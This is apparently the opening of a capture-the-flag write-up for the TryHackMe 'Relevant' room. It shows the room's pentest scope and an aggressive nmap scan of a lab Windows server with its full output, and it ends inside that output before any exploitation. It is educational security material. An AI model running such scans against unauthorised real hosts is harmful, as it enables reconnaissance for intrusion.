
# TryHackMe(THM) - Relevant - WriteUp

> Austin Lai | August 24th, 2021

---

<!-- Description -->

[Room = TryHackMe(THM) - Relevant](https://tryhackme.com/room/relevant)

Difficulty: **Medium**

The room is completed on Jul 24th, 2021

```text
Penetration Testing Challenge
```

<!-- /Description -->

## Table of Contents

<!-- TOC -->

- [TryHackMe(THM) - Relevant - WriteUp](#tryhackmethm---relevant---writeup)
    - [Table of Contents](#table-of-contents)
    - [Task 1](#task-1)
    - [Let's Begin Here !!!](#lets-begin-here-)

<!-- /TOC -->

---

## Task 1

```markdown

You have been assigned to a client that wants a penetration test conducted on an environment due to be released to production in seven days. 

# Scope of Work

The client requests that an engineer conducts an assessment of the provided virtual environment.

The client has asked that minimal information be provided about the assessment, wanting the engagement conducted from the eyes of a malicious actor (black box penetration test).

The client has asked that you secure two flags (no location provided) as proof of exploitation:

- User.txt
- Root.txt

Additionally, the client has provided the following scope allowances:

- Any tools or techniques are permitted in this engagement, however we ask that you attempt manual exploitation first
- Locate and note all vulnerabilities found
- Submit the flags discovered to the dashboard
- Only the IP address assigned to your machine is in scope
- Find and report ALL vulnerabilities (yes, there is more than one path to root)
- (Roleplay off)

I encourage you to approach this challenge as an actual penetration test.

Consider writing a report, to include an executive summary, vulnerability and exploitation assessment, and remediation suggestions, as this will benefit you in preparation for the eLearn Security Certified Professional Penetration Tester or career as a penetration tester in the field.

Note - Nothing in this room requires Metasploit

Machine may take up to 5 minutes for all services to start.
```

---

## Let's Begin Here !!!

Let's fire up basic enumeration.

Nmap result:

```text
# Nmap 7.91 scan initiated Fri Jul 23 23:54:22 2021 as: nmap --privileged --stats-every 15s -vvvvvv -n -Pn -p- -r -A -sCSV -O --version-all -T4 --min-parallelism 30 --min-rate 300 --script=safe --script-trace --reason --append-output -oN TryHackMe-full-safe-scan-Relevant-initial 10.10.63.141 Relevant-initial 10.10.63.141
Nmap scan report for 10.10.63.141
Host is up, received user-set (0.37s latency).
Scanned at 2021-07-23 23:58:02 Malay Peninsula Standard Time for 925s
Not shown: 65527 filtered ports
Reason: 65527 no-responses
PORT      STATE SERVICE       REASON          VERSION
80/tcp    open  http          syn-ack ttl 125 Microsoft IIS httpd 10.0
| http-comments-displayer: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.63.141
|     
|     Path: http://10.10.63.141:80/
|     Line number: 7
|     Comment: 
|         
|_        -->
|_http-date: Fri, 23 Jul 2021 16:06:31 GMT; -1s from local time.
|_http-fetch: Please enter the complete path of the directory to save data in.
| http-headers: 
|   Content-Length: 703
|   Content-Type: text/html
|   Last-Modified: Sat, 25 Jul 2020 15:05:21 GMT
|   Accept-Ranges: bytes
|   ETag: "2db43349562d61:0"
|   Server: Microsoft-IIS/10.0
|   X-Powered-By: ASP.NET
|   Date: Fri, 23 Jul 2021 16:06:45 GMT
|   Connection: close
|   
|_  (Request type: HEAD)
|_http-jsonp-detection: Couldn't find any JSONP endpoints.
|_http-malware-host: Host appears to be clean
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-mobileversion-checker: No mobile version detected.
| http-php-version: Logo query returned unknown hash 242c23ea412530c7d94b77a7a978c176
|_Credits query returned unknown hash 242c23ea412530c7d94b77a7a978c176
|_http-referer-checker: Couldn't find any cross-domain scripts.
|_http-security-headers: 
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-useragent-tester: 
|   Status for browser useragent: 200
|   Allowed User Agents: 
|     Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
|     lwp-trivial
|     libcurl-agent/1.0
|     PHP/
|     Python-urllib/2.5
|     GT::WWW
|     Snoopy
|     MFC_Tear_Sample
|     HTTP::Lite
|     PHPCrawl
|     URI::Fetch
|     Zend_Http_Client
|     http client
|     PECL::HTTP
|     Wget/1.13.4 (linux-gnu)
|_    WWW-Mechanize/1.34
|_http-xssed: No previously reported XSS vuln.
135/tcp   open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 125 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  syn-ack ttl 125 Windows Server 2016 Standard Evaluation 14393 microsoft-ds
3389/tcp  open  ms-wbt-server syn-ack ttl 125 Microsoft Terminal Services
| rdp-enum-encryption: 
|   Security layer
|     CredSSP (NLA): SUCCESS
|     CredSSP with Early User Auth: SUCCESS
|_    RDSTLS: SUCCESS
| rdp-ntlm-info: 
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2021-07-23T16:06:44+00:00
| ssl-cert: Subject: commonName=Relevant
| Issuer: commonName=Relevant
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-07-22T15:53:10
| Not valid after:  2022-01-21T15:53:10
| MD5:   5b61 d029 1a17 b7d4 3c86 0172 9cbc 7cd8
| SHA-1: 21af 8329 61c9 d793 54c6 30a1 f4c3 8227 3ae6 5892
| -----BEGIN CERTIFICATE-----
| MIIC1DCCAbygAwIBAgIQFD8FKMCUQJtGVcz9SFPi5zANBgkqhkiG9w0BAQsFADAT
| MREwDwYDVQQDEwhSZWxldmFudDAeFw0yMTA3MjIxNTUzMTBaFw0yMjAxMjExNTUz
| MTBaMBMxETAPBgNVBAMTCFJlbGV2YW50MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
| MIIBCgKCAQEAynMgc1e4OBf1u1fudOc+vSH9p4E2oDFim5eJvlng6v+T7p15XySm
| x0eCzE95zuw6mZhkT39NTjV/ray9ikTxd4uVcbOhgmJUF6PCKtzNsquiCqRv6eHh
| FyLG5aUSk8U8wQ6v87tbFP3x3/WGeqU05tlZ+mZt0d7nQP57UYBbt/HCmCXnABfi
| RhECsyhP+rTvKXSAK1iZ484sAbdE/s/v6u0JxveKFJuSBQVJ3VB4tnmwB0Qn9Ujd
| geEumrKDCp69AEf4UIDvklaHzydZTZzCSuAMbmWg7WJEOQI06QMqkDVbFdjE3T/c
| btB+p2qNuKos36Mx/2UYtehyPqJy9CnWewIDAQABoyQwIjATBgNVHSUEDDAKBggr
| BgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQADggEBAKDENUB5Y0qj
| mTZWXxswMeQtA9VGCClCDuSIsa0S9KQTCKLq5iXRKsCcsrDdIAWTbhSu0tLCzP/h
| hsnzJHjEzDXpBaOIwjU8fKVR7mYF4eZV89M5zN7SDXHJX1lowJUrk2ftfA3fO313
| n67GUpd4snmXX2lKpZnlesBFdsZa9IT0RghktC5WTvhKDZG/DMJbEXKZuXB2FxIK
| DgGE4n7uAoK/actZObW91FkupWN+SLXlNZJMk9UhljqU66HLhB8zUJfDV7vqBTYD
| j+c0N6zqoltN8bSxt5vFx1PkI8gjN1kKUeUE2eAgE+Pm8LJzpe4RnRLUxALujxMH
| v84RL1Sdy70=
|_-----END CERTIFICATE-----
|_ssl-date: 2021-07-23T16:13:08+00:00; 0s from scanner time.
49663/tcp open  http          syn-ack ttl 125 Microsoft IIS httpd 10.0
|_http-comments-displayer: Couldn't find any comments.
|_http-date: Fri, 23 Jul 2021 16:06:33 GMT; -1s from local time.
|_http-fetch: Please enter the complete path of the directory to save data in.
| http-headers: 
|   Content-Length: 703
|   Content-Type: text/html
|   Last-Modified: Sat, 25 Jul 2020 15:05:21 GMT
|   Accept-Ranges: bytes
|   ETag: "2db43349562d61:0"
|   Server: Microsoft-IIS/10.0
|   X-Powered-By: ASP.NET
|   Date: Fri, 23 Jul 2021 16:06:48 GMT
|   Connection: close
|   
|_  (Request type: HEAD)
|_http-jsonp-detection: Couldn't find any JSONP endpoints.
|_http-malware-host: Host appears to be clean
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-mobileversion-checker: No mobile version detected.
| http-php-version: Logo query returned unknown hash 242c23ea412530c7d94b77a7a978c176
|_Credits query returned unknown hash 242c23ea412530c7d94b77a7a978c176
|_http-referer-checker: Couldn't find any cross-domain scripts.
|_http-security-headers: 
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-useragent-tester: 
|   Status for browser useragent: 200
|   Allowed User Agents: 
|     libwww
|     lwp-trivial
|     libcurl-agent/1.0
|     PHP/
|     Python-urllib/2.5
|     GT::WWW
|     Snoopy
|     MFC_Tear_Sample
|     HTTP::Lite
|     PHPCrawl
|     URI::Fetch
|     Zend_Http_Client
|     http client
|     PECL::HTTP
|     Wget/1.13.4 (linux-gnu)
|_    WWW-Mechanize/1.34
|_http-xssed: No previously reported XSS vuln.
49667/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2016|10 (87%)
OS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_10:1607
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows Server 2016 (87%), Microsoft Windows 10 1607 (85%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.91%E=4%D=7/24%OT=80%CT=%CU=%PV=Y%DS=4%DC=T%G=N%TM=60FAEAA7%P=i686-pc-windows-windows)
SEQ(SP=104%GCD=1%ISR=10D%TI=I%II=I%SS=O%TS=A)
OPS(O1=M508NW8ST11%O2=M508NW8ST11%O3=M508NW8NNT11%O4=M508NW8ST11%O5=M508NW8ST11%O6=M508ST11)
WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)
ECN(R=Y%DF=Y%TG=80%W=2000%O=M508NW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=80%CD=Z)

Uptime guess: 0.016 days (since Fri Jul 23 23:50:16 2021)
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h00m01s, deviation: 2h38m50s, median: 0s
| dns-blacklist: 
|   SPAM
|_    l2.apews.org - FAIL
|_fcrdns: FAIL (No PTR record)
|_firewalk: ERROR: Script execution failed (use -d to debug)
|_ipidseq: ERROR: Script execution failed (use -d to debug)
| msrpc-enum: 
|   
|     ip_addr: 0.0.0.0
|     uuid: d95afe70-a6d5-4259-822e-2c84da1ddb0d
|     tcp_port: 49664
|   
|     ncalrpc: OLE4DCC4863341097B1549D11EDBA48
|     annotation: Impl friendly name
|     uuid: c9ac6db5-82b7-4e55-ae8a-e464ed7b4277
|   
|     ncalrpc: LRPC-f703a82c7d5eee16bd
|     annotation: Impl friendly name
|     uuid: c9ac6db5-82b7-4e55-ae8a-e464ed7b4277
|   
|     ncalrpc: ClipServiceTransportEndpoint-00001
|     annotation: CLIPSVC Default RPC Interface
|     uuid: 64d1d045-f675-460b-8a94-570246b36dab
|   
|     ncalrpc: LRPC-cbc18b7be7f1c3bd4d
|     uuid: 906b0ce0-c70b-1067-b317-00dd010662da
|   
|     ncalrpc: LRPC-cbc18b7be7f1c3bd4d
|     uuid: 906b0ce0-c70b-1067-b317-00dd010662da
|   
|     ncalrpc: LRPC-cbc18b7be7f1c3bd4d
|     uuid: 906b0ce0-c70b-1067-b317-00dd010662da
|   
|     ncalrpc: LRPC-15a641590555c8856b
|     uuid: f3f09ffd-fbcf-4291-944d-70ad6e0e73bb
|   
|     ncalrpc: WMsgKRpc057761
|     uuid: 76f226c3-ec14-4325-8a99-6a46348418af
|   
|     ip_addr: 0.0.0.0
|     uuid: 367abb81-9844-35f1-ad32-98f038001003
|     tcp_port: 49673
|   
|     ncalrpc: SPPCTransportEndpoint-00001
|     annotation: SPPSVC Default RPC Interface
|     uuid: 9435cc56-1d9c-4924-ac7d-b60a2c3520e1
|   
|     ncalrpc: LRPC-82d925b96d31402945
|     uuid: 4c9dbf19-d39e-4bb9-90ee-8f7179b20283
|   
|     ncalrpc: LRPC-82d925b96d31402945
|     uuid: e38f5360-8572-473e-b696-1b46873beeab
|   
|     ncalrpc: LRPC-b66b93c2d01b4ff0d6
|     annotation: XactSrv service
|     uuid: 98716d03-89ac-44c7-bb8c-285824e51c4a
|   
|     ncalrpc: LRPC-b66b93c2d01b4ff0d6
|     annotation: IdSegSrv service
|     uuid: 1a0d010f-1c33-432c-b0f5-8cf4e8053099
|   
|     ncalrpc: LRPC-38a5eb2d71b6c965dc
|     uuid: 12345678-1234-abcd-ef00-0123456789ab
|   
|     ip_addr: 0.0.0.0
|     uuid: 12345678-1234-abcd-ef00-0123456789ab
|     tcp_port: 49669
|   
|     ncalrpc: LRPC-38a5eb2d71b6c965dc
|     uuid: 0b6edbfa-4a24-4fc6-8a23-942b1eca65d1
|   
|     ip_addr: 0.0.0.0
|     uuid: 0b6edbfa-4a24-4fc6-8a23-942b1eca65d1
|     tcp_port: 49669
|   
|     ncalrpc: LRPC-38a5eb2d71b6c965dc
|     uuid: ae33069b-a2a8-46ee-a235-ddfd339be281
|   
|     ip_addr: 0.0.0.0
|     uuid: ae33069b-a2a8-46ee-a235-ddfd339be281
|     tcp_port: 49669
|   
|     ncalrpc: LRPC-38a5eb2d71b6c965dc
|     uuid: 4a452661-8290-4b36-8fbe-7f4093a94978
|   
|     ip_addr: 0.0.0.0
|     uuid: 4a452661-8290-4b36-8fbe-7f4093a94978
|     tcp_port: 49669
|   
|     ncalrpc: LRPC-38a5eb2d71b6c965dc
|     uuid: 76f03f96-cdfd-44fc-a22c-64950a001209
|   
|     ip_addr: 0.0.0.0
|     uuid: 76f03f96-cdfd-44fc-a22c-64950a001209
|     tcp_port: 49669
|   
|     ncalrpc: LRPC-3c61685fafc2639af8
|     uuid: abfb6ca3-0c5e-4734-9285-0aee72fe8d1c
|   
|     ncalrpc: LRPC-3c61685fafc2639af8
|     uuid: b37f900a-eae4-4304-a2ab-12bb668c0188
|   
|     ncalrpc: LRPC-3c61685fafc2639af8
|     uuid: b3781086-6a54-489b-91c8-51d067172ab7
|   
|     ncalrpc: LRPC-3c61685fafc2639af8
|     uuid: e7f76134-9ef5-4949-a2d6-3368cc0988f3
|   
|     ncalrpc: LRPC-3c61685fafc2639af8
|     uuid: 7aeb6705-3ae6-471a-882d-f39c109edc12
|   
|     ncalrpc: LRPC-325ae2f68d17ae4c8f
|     annotation: Witness Client Upcall Server
|     uuid: f2c9b409-c1c9-4100-8639-d8ab1486694a
|   
|     ncalrpc: LRPC-325ae2f68d17ae4c8f
|     annotation: Witness Client Test Interface
|     uuid: eb081a0d-10ee-478a-a1dd-50995283e7a8
|   
|     ncalrpc: LRPC-325ae2f68d17ae4c8f
|     annotation: DfsDs service
|     uuid: 7f1343fe-50a9-4927-a778-0c5859517bac
|   
|     ncalrpc: nlaplg
|     annotation: DfsDs service
|     uuid: 7f1343fe-50a9-4927-a778-0c5859517bac
|   
|     netbios: \\RELEVANT
|     annotation: DfsDs service
|     uuid: 7f1343fe-50a9-4927-a778-0c5859517bac
|     ncacn_np: \PIPE\wkssvc
|   
|     ncalrpc: OLEBFE1F3A598594A51365C1EFA85E1
|     uuid: 30b044a5-a225-43f0-b3a4-e060df91f9c1
|   
|     ncalrpc: LRPC-483eb1cc6d011a2d23
|     uuid: 30b044a5-a225-43f0-b3a4-e060df91f9c1
|   
|     ncalrpc: OLEBFE1F3A598594A51365C1EFA85E1
|     annotation: Impl friendly name
|     uuid: c9ac6db5-82b7-4e55-ae8a-e464ed7b4277
|   
|     ncalrpc: LRPC-483eb1cc6d011a2d23
|     annotation: Impl friendly name
|     uuid: c9ac6db5-82b7-4e55-ae8a-e464ed7b4277
|   
|     ncalrpc: IUserProfile2
|     annotation: Impl friendly name
|     uuid: c9ac6db5-82b7-4e55-ae8a-e464ed7b4277
|   
|     ncalrpc: OLEBFE1F3A598594A51365C1EFA85E1
|     annotation: Impl friendly name
|     uuid: c9ac6db5-82b7-4e55-ae8a-e464ed7b4277
|   
|     ncalrpc: LRPC-483eb1cc6d011a2d23
|     annotation: Impl friendly name
|     uuid: c9ac6db5-82b7-4e55-ae8a-e464ed7b4277
|   
|     ncalrpc: IUserProfile2
|     annotation: Impl friendly name
|     uuid: c9ac6db5-82b7-4e55-ae8a-e464ed7b4277
|   
|     ncalrpc: LRPC-803f87aaaafaee5231
|     annotation: Group Policy RPC Interface
|     uuid: 2eb08e3e-639f-4fba-97b1-14f878961076
|   
|     ncalrpc: OLEBFE1F3A598594A51365C1EFA85E1
|     annotation: Impl friendly name
|     uuid: c9ac6db5-82b7-4e55-ae8a-e464ed7b4277
|   
|     ncalrpc: LRPC-483eb1cc6d011a2d23
|     annotation: Impl friendly name
|     uuid: c9ac6db5-82b7-4e55-ae8a-e464ed7b4277
|   
|     ncalrpc: IUserProfile2
|     annotation: Impl friendly name
|     uuid: c9ac6db5-82b7-4e55-ae8a-e464ed7b4277
|   
|     ncalrpc: senssvc
|     annotation: Impl friendly name
|     uuid: c9ac6db5-82b7-4e55-ae8a-e464ed7b4277
|   
|     ncalrpc: OLEBFE1F3A598594A51365C1EFA85E1
|     annotation: Impl friendly name
|     uuid: c9ac6db5-82b7-4e55-ae8a-e464ed7b4277
|   
|     ncalrpc: LRPC-483eb1cc6d011a2d23
|     annotation: Impl friendly name
|     uuid: c9ac6db5-82b7-4e55-ae8a-e464ed7b4277
|   
|     ncalrpc: IUserProfile2
|     annotation: Impl friendly name
|     uuid: c9ac6db5-82b7-4e55-ae8a-e464ed7b4277
|   
|     ncalrpc: senssvc
|     annotation: Impl friendly name
|     uuid: c9ac6db5-82b7-4e55-ae8a-e464ed7b4277
|   
|     ncalrpc: OLEBFE1F3A598594A51365C1EFA85E1
|     uuid: 29770a8f-829b-4158-90a2-78cd488501f7
|   
|     ncalrpc: LRPC-483eb1cc6d011a2d23
|     uuid: 29770a8f-829b-4158-90a2-78cd488501f7
|   
|     ncalrpc: IUserProfile2
|     uuid: 29770a8f-829b-4158-90a2-78cd488501f7
|   
|     ncalrpc: senssvc
|     uuid: 29770a8f-829b-4158-90a2-78cd488501f7
|   
|     ncalrpc: SessEnvPrivateRpc
|     uuid: 29770a8f-829b-4158-90a2-78cd488501f7
|   
|     netbios: \\RELEVANT
|     uuid: 29770a8f-829b-4158-90a2-78cd488501f7
|     ncacn_np: \pipe\SessEnvPublicRpc
|   
|     ip_addr: 0.0.0.0
|     uuid: 29770a8f-829b-4158-90a2-78cd488501f7
|     tcp_port: 49667
|   
|     ncalrpc: OLEBFE1F3A598594A51365C1EFA85E1
|     uuid: 0a74ef1c-41a4-4e06-83ae-dc74fb1cdd53
|   
|     ncalrpc: LRPC-483eb1cc6d011a2d23
|     uuid: 0a74ef1c-41a4-4e06-83ae-dc74fb1cdd53
|   
|     ncalrpc: IUserProfile2
|     uuid: 0a74ef1c-41a4-4e06-83ae-dc74fb1cdd53
|   
|     ncalrpc: senssvc
|     uuid: 0a74ef1c-41a4-4e06-83ae-dc74fb1cdd53
|   
|     ncalrpc: SessEnvPrivateRpc
|     uuid: 0a74ef1c-41a4-4e06-83ae-dc74fb1cdd53
|   
|     netbios: \\RELEVANT
|     uuid: 0a74ef1c-41a4-4e06-83ae-dc74fb1cdd53
|     ncacn_np: \pipe\SessEnvPublicRpc
|   
|     ip_addr: 0.0.0.0
|     uuid: 0a74ef1c-41a4-4e06-83ae-dc74fb1cdd53
|     tcp_port: 49667
|   
|     exe: mstask.exe atsvc interface (Scheduler service)
|     ncalrpc: OLEBFE1F3A598594A51365C1EFA85E1
|     uuid: 1ff70682-0a51-30e8-076d-740be8cee98b
|   
|     exe: mstask.exe atsvc interface (Scheduler service)
|     ncalrpc: LRPC-483eb1cc6d011a2d23
|     uuid: 1ff70682-0a51-30e8-076d-740be8cee98b
|   
|     exe: mstask.exe atsvc interface (Scheduler service)
|     ncalrpc: IUserProfile2
|     uuid: 1ff70682-0a51-30e8-076d-740be8cee98b
|   
|     exe: mstask.exe atsvc interface (Scheduler service)
|     ncalrpc: senssvc
|     uuid: 1ff70682-0a51-30e8-076d-740be8cee98b
|   
|     exe: mstask.exe atsvc interface (Scheduler service)
|     ncalrpc: SessEnvPrivateRpc
|     uuid: 1ff70682-0a51-30e8-076d-740be8cee98b
|   
|     exe: mstask.exe atsvc interface (Scheduler service)
|     netbios: \\RELEVANT
|     uuid: 1ff70682-0a51-30e8-076d-740be8cee98b
|     ncacn_np: \pipe\SessEnvPublicRpc
|   
|     exe: mstask.exe atsvc interface (Scheduler service)
|     ip_addr: 0.0.0.0
|     uuid: 1ff70682-0a51-30e8-076d-740be8cee98b
|     tcp_port: 49667
|   
|     exe: mstask.exe atsvc interface (Scheduler service)
|     netbios: \\RELEVANT
|     uuid: 1ff70682-0a51-30e8-076d-740be8cee98b
|     ncacn_np: \PIPE\atsvc
|   
|     ncalrpc: OLEBFE1F3A598594A51365C1EFA85E1
|     uuid: 378e52b0-c0a9-11cf-822d-00aa0051e40f
|   
|     ncalrpc: LRPC-483eb1cc6d011a2d23
|     uuid: 378e52b0-c0a9-11cf-822d-00aa0051e40f
|   
|     ncalrpc: IUserProfile2
|     uuid: 378e52b0-c0a9-11cf-822d-00aa0051e40f
|   
|     ncalrpc: senssvc
|     uuid: 378e52b0-c0a9-11cf-822d-00aa0051e40f
|   
|     ncalrpc: SessEnvPrivateRpc
|     uuid: 378e52b0-c0a9-11cf-822d-00aa0051e40f
|   
|     netbios: \\RELEVANT
|     uuid: 378e52b0-c0a9-11cf-822d-00aa0051e40f
|     ncacn_np: \pipe\SessEnvPublicRpc
|   
|     ip_addr: 0.0.0.0
|     uuid: 378e52b0-c0a9-11cf-822d-00aa0051e40f
|     tcp_port: 49667
|   
|     netbios: \\RELEVANT
|     uuid: 378e52b0-c0a9-11cf-822d-00aa0051e40f
|     ncacn_np: \PIPE\atsvc
|   
|     ncalrpc: OLEBFE1F3A598594A51365C1EFA85E1
|     uuid: 33d84484-3626-47ee-8c6f-e7e98b113be1
|   
|     ncalrpc: LRPC-483eb1cc6d011a2d23
|     uuid: 33d84484-3626-47ee-8c6f-e7e98b113be1
|   
|     ncalrpc: IUserProfile2
|     uuid: 33d84484-3626-47ee-8c6f-e7e98b113be1
|   
|     ncalrpc: senssvc
|     uuid: 33d84484-3626-47ee-8c6f-e7e98b113be1
|   
|     ncalrpc: SessEnvPrivateRpc
|     uuid: 33d84484-3626-47ee-8c6f-e7e98b113be1
|   
|     netbios: \\RELEVANT
|     uuid: 33d84484-3626-47ee-8c6f-e7e98b113be1
|     ncacn_np: \pipe\SessEnvPublicRpc
|   
|     ip_addr: 0.0.0.0
|     uuid: 33d84484-3626-47ee-8c6f-e7e98b113be1
|     tcp_port: 49667
|   
|     netbios: \\RELEVANT
|     uuid: 33d84484-3626-47ee-8c6f-e7e98b113be1
|     ncacn_np: \PIPE\atsvc
|   
|     ncalrpc: ubpmtaskhostchannel
|     uuid: 33d84484-3626-47ee-8c6f-e7e98b113be1
|   
|     ncalrpc: DeviceSetupManager
|     uuid: 33d84484-3626-47ee-8c6f-e7e98b113be1
|   
|     ncalrpc: LRPC-a80ac9a09405818e3f
|     uuid: 33d84484-3626-47ee-8c6f-e7e98b113be1
|   
|     ncalrpc: OLEBFE1F3A598594A51365C1EFA85E1
|     uuid: 86d35949-83c9-4044-b424-db363231fd0c
|   
|     ncalrpc: LRPC-483eb1cc6d011a2d23
|     uuid: 86d35949-83c9-4044-b424-db363231fd0c
|   
|     ncalrpc: IUserProfile2
|     uuid: 86d35949-83c9-4044-b424-db363231fd0c
|   
|     ncalrpc: senssvc
|     uuid: 86d35949-83c9-4044-b424-db363231fd0c
|   
|     ncalrpc: SessEnvPrivateRpc
|     uuid: 86d35949-83c9-4044-b424-db363231fd0c
|   
|     netbios: \\RELEVANT
|     uuid: 86d35949-83c9-4044-b424-db363231fd0c
|     ncacn_np: \pipe\SessEnvPublicRpc
|   
|     ip_addr: 0.0.0.0
|     uuid: 86d35949-83c9-4044-b424-db363231fd0c
|     tcp_port: 49667
|   
|     netbios: \\RELEVANT
|     uuid: 86d35949-83c9-4044-b424-db363231fd0c
|     ncacn_np: \PIPE\atsvc
|   
|     ncalrpc: ubpmtaskhostchannel
|     uuid: 86d35949-83c9-4044-b424-db363231fd0c
|   
|     ncalrpc: DeviceSetupManager
|     uuid: 86d35949-83c9-4044-b424-db363231fd0c
|   
|     ncalrpc: LRPC-a80ac9a09405818e3f
|     uuid: 86d35949-83c9-4044-b424-db363231fd0c
|   
|     ncalrpc: OLEBFE1F3A598594A51365C1EFA85E1
|     uuid: 3a9ef155-691d-4449-8d05-09ad57031823
|   
|     ncalrpc: LRPC-483eb1cc6d011a2d23
|     uuid: 3a9ef155-691d-4449-8d05-09ad57031823
|   
|     ncalrpc: IUserProfile2
|     uuid: 3a9ef155-691d-4449-8d05-09ad57031823
|   
|     ncalrpc: senssvc
|     uuid: 3a9ef155-691d-4449-8d05-09ad57031823
|   
|     ncalrpc: SessEnvPrivateRpc
|     uuid: 3a9ef155-691d-4449-8d05-09ad57031823
|   
|     netbios: \\RELEVANT
|     uuid: 3a9ef155-691d-4449-8d05-09ad57031823
|     ncacn_np: \pipe\SessEnvPublicRpc
|   
|     ip_addr: 0.0.0.0
|     uuid: 3a9ef155-691d-4449-8d05-09ad57031823
|     tcp_port: 49667
|   
|     netbios: \\RELEVANT
|     uuid: 3a9ef155-691d-4449-8d05-09ad57031823
|     ncacn_np: \PIPE\atsvc
|   
|     ncalrpc: ubpmtaskhostchannel
|     uuid: 3a9ef155-691d-4449-8d05-09ad57031823
|   
|     ncalrpc: DeviceSetupManager
|     uuid: 3a9ef155-691d-4449-8d05-09ad57031823
|   
|     ncalrpc: LRPC-a80ac9a09405818e3f
|     uuid: 3a9ef155-691d-4449-8d05-09ad57031823
|   
|     ncalrpc: OLEBFE1F3A598594A51365C1EFA85E1
|     annotation: UserMgrCli
|     uuid: b18fbab6-56f8-4702-84e0-41053293a869
|   
|     ncalrpc: LRPC-483eb1cc6d011a2d23
|     annotation: UserMgrCli
|     uuid: b18fbab6-56f8-4702-84e0-41053293a869
|   
|     ncalrpc: IUserProfile2
|     annotation: UserMgrCli
|     uuid: b18fbab6-56f8-4702-84e0-41053293a869
|   
|     ncalrpc: senssvc
|     annotation: UserMgrCli
|     uuid: b18fbab6-56f8-4702-84e0-41053293a869
|   
|     ncalrpc: SessEnvPrivateRpc
|     annotation: UserMgrCli
|     uuid: b18fbab6-56f8-4702-84e0-41053293a869
|   
|     netbios: \\RELEVANT
|     annotation: UserMgrCli
|     uuid: b18fbab6-56f8-4702-84e0-41053293a869
|     ncacn_np: \pipe\SessEnvPublicRpc
|   
|     ip_addr: 0.0.0.0
|     annotation: UserMgrCli
|     uuid: b18fbab6-56f8-4702-84e0-41053293a869
|     tcp_port: 49667
|   
|     netbios: \\RELEVANT
|     annotation: UserMgrCli
|     uuid: b18fbab6-56f8-4702-84e0-41053293a869
|     ncacn_np: \PIPE\atsvc
|   
|     ncalrpc: ubpmtaskhostchannel
|     annotation: UserMgrCli
|     uuid: b18fbab6-56f8-4702-84e0-41053293a869
|   
|     ncalrpc: DeviceSetupManager
|     annotation: UserMgrCli
|     uuid: b18fbab6-56f8-4702-84e0-41053293a869
|   
|     ncalrpc: LRPC-a80ac9a09405818e3f
|     annotation: UserMgrCli
|     uuid: b18fbab6-56f8-4702-84e0-41053293a869
|   
|     ncalrpc: LRPC-c8ad155a96be6fec85
|     annotation: UserMgrCli
|     uuid: b18fbab6-56f8-4702-84e0-41053293a869
|   
|     ncalrpc: OLEBFE1F3A598594A51365C1EFA85E1
|     annotation: UserMgrCli
|     uuid: 0d3c7f20-1c8d-4654-a1b3-51563b298bda
|   
|     ncalrpc: LRPC-483eb1cc6d011a2d23
|     annotation: UserMgrCli
|     uuid: 0d3c7f20-1c8d-4654-a1b3-51563b298bda
|   
|     ncalrpc: IUserProfile2
|     annotation: UserMgrCli
|     uuid: 0d3c7f20-1c8d-4654-a1b3-51563b298bda
|   
|     ncalrpc: senssvc
|     annotation: UserMgrCli
|     uuid: 0d3c7f20-1c8d-4654-a1b3-51563b298bda
|   
|     ncalrpc: SessEnvPrivateRpc
|     annotation: UserMgrCli
|     uuid: 0d3c7f20-1c8d-4654-a1b3-51563b298bda
|   
|     netbios: \\RELEVANT
|     annotation: UserMgrCli
|     uuid: 0d3c7f20-1c8d-4654-a1b3-51563b298bda
|     ncacn_np: \pipe\SessEnvPublicRpc
|   
|     ip_addr: 0.0.0.0
|     annotation: UserMgrCli
|     uuid: 0d3c7f20-1c8d-4654-a1b3-51563b298bda
|     tcp_port: 49667
|   
|     netbios: \\RELEVANT
|     annotation: UserMgrCli
|     uuid: 0d3c7f20-1c8d-4654-a1b3-51563b298bda
|     ncacn_np: \PIPE\atsvc
|   
|     ncalrpc: ubpmtaskhostchannel
|     annotation: UserMgrCli
|     uuid: 0d3c7f20-1c8d-4654-a1b3-51563b298bda
|   
|     ncalrpc: DeviceSetupManager
|     annotation: UserMgrCli
|     uuid: 0d3c7f20-1c8d-4654-a1b3-51563b298bda
|   
|     ncalrpc: LRPC-a80ac9a09405818e3f
|     annotation: UserMgrCli
|     uuid: 0d3c7f20-1c8d-4654-a1b3-51563b298bda
|   
